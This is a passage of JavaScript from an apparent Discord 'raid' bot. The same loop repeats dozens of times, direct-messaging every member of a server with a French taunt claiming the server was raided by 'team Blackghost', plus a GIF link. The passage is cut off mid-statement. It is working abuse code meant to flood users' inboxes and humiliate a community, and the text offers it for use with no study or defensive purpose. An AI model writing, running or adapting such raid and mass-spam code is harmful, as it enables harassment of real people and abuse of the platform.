			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
			message.guild.member(player).send('Oh dommage, le serveur de ton pote s\'est fait raid par la team Blackghost, encore désolé.. \nhttps://i.imgur.com/gjv5CaH.gif')
		})
		message.guild.members.forEach((player) => {
